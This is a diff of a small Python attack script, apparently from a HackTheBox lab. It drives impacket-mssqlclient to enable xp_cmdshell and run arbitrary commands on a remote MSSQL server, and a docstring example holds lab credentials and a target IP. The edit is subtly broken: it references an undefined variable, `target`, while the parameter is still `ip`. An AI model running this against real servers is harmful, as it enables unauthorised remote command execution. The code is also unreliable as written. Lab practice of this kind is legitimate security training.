@@ -1,8 +1,18 @@
 import pwn
 import os
 
+"""
+With valid credentials and correct permissions, execute commands on remote MSSQL server
+
+Example usage (Tested on HTB Querier):
+    username = "mssql-svc"
+    password = "corporate568"
+    target = "10.10.10.125"
+    command = "ping 10.10.14.10"
+    print(mssql_rce(username, password, target, command))
+"""
 def mssql_rce(username, password, ip, command):
-    p = pwn.process(["/usr/bin/impacket-mssqlclient", "-windows-auth", f"{username}:{password}@{ip}"], stdin=pwn.PTY)
+    p = pwn.process(["/usr/bin/impacket-mssqlclient", "-windows-auth", f"{username}:{password}@{target}"], stdin=pwn.PTY)
     p.readuntil(")>")
     p.send(b"enable_xp_cmdshell\n")
     p.send(b'\4')
@@ -17,8 +27,4 @@ def mssql_rce(username, password, ip, command):
     return cleaned_output
 
 if __name__=="__main__":
-    username = "mssql-svc"
-    password = "corporate568"
-    ip = "10.10.10.125"
-    command = "ping 10.10.14.10"
-    print(mssql_rce(username, password, ip, command))
+    pass
